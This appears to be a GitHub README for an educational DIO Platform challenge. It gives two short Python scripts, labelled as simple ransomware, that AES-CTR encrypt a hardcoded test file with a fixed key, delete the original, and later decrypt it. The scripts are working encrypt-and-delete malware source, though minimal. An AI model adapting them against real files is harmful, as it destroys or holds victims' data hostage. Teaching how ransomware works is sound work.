
#DIO Platform Ransomware Challenge Repository
This repository is created to store the DIO Platform Ransomware Challenge, showcasing a simple implementation of ransomware encryption and decryption using Python.

Description
The challenge demonstrates a basic ransomware script written in Python using the pyaes library for encryption and decryption. It encrypts a specified file with a hardcoded key and saves the encrypted data in a new file with a '.ransomwaretroll' extension. The decryption script reverses this process, decrypting the encrypted file and restoring it to its original state.

Usage
Encryption
To encrypt a file, run the encrypt.py script with the following command:

bash
Copy code
python encrypt.py
Replace "teste.txt" with the name of the file you want to encrypt.

Decryption
To decrypt a file encrypted by the ransomware, run the decrypt.py script with the following command:

bash
Copy code
python decrypt.py
Replace "teste.txt.ransomwaretroll" with the name of the encrypted file you want to decrypt.

Code
Encryption Script (encrypt.py)
python
Copy code
import os
import pyaes

# Open the file to be encrypted
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Remove the original file
os.remove(file_name)

# Encryption key
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Encrypt the file
crypto_data = aes.encrypt(file_data)

# Save the encrypted file
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
Decryption Script (decrypt.py)
python
Copy code
import os
import pyaes

file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Remove the encrypted file
os.remove(file_name)

# Decryption key
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypted_data = aes.decrypt(file_data)

# Save the decrypted file
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypted_data)
new_file.close()
Disclaimer
This code is for educational purposes only. Ransomware activities are illegal and unethical. Please use this knowledge responsibly and refrain from engaging in any malicious activities.
